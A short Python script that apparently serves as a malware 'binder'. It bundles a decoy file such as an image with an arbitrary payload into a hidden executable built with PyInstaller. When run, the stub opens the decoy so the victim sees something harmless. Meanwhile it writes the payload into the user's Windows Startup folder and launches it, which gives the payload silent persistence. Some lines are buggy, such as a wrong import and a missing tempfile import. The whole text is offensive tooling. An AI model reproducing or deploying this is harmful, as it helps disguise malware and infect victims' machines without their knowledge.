from base64 import b64encode
file1=input('jpg or anyfile(dont set payload) => ')
filer1=open(file1,'rb').read()
file2=input('set payload => ')
filer2=open(file2,'rb').read()
file1_B64_encode=b64encode(filer1)
file2_B64_encode=b64encode(filer2)	
open('binded.py','w').write('''
import os
import getpass
import gettempdir
import base64
from time import sleep
import sys
exec("""
payload_dir=sys.argv[0]
payload=open(payload_dir.decode('utf8'),'rb').read()
open(os.path.join(tempfile.gettempdir(),'nordjik.exe'),'wb').write(payload)
file1_b64_decode=base64.b64decode('%s')
file2_b64_decode=base64.b64decode('%s')
file1=os.path.join(tempfile.gettempdir(),'%s')
open(file1,'wb').write(file1_b64_decode)
os.startfile(file1)
user=getpass.getuser()
start="C:\\Users\\kk"
start=start.replace('kk',user)+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
file2=os.path.join(start,'%s')
if os.path.exists(file2)==False:
    open(file2,'wb').write(file2_b64_decode)
    os.startfile(file2)
sys.exit()""")
'''%(file1_B64_encode,file2_B64_encode,file1,file2))
import os
os.system('pyinstaller --clean --noconsole --windowed --onefile binded.py"')
